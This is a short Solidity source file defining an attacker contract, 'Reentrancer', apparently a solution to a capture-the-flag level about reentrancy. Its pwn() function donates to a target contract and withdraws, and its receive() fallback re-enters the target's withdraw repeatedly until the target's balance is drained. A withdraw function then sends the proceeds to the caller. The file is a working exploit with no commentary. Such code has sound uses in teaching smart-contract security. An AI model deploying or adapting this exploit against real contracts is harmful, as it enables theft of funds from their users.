// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrancer {
    
    uint256 _fund;
    IReentrance _contract;

    constructor(IReentrance _addres) payable {
        _fund += msg.value;
        _contract = _addres;
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function pwn() public {
        _contract.donate{value:_fund}(address(this));
        _contract.withdraw(_fund);
    }

    receive() external payable {
        uint256 contractBalance = address(_contract).balance;
        if (contractBalance > 0){
            if (contractBalance > _fund) contractBalance = _fund;
            _contract.withdraw(contractBalance);
        }
    }
}

interface IReentrance {
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}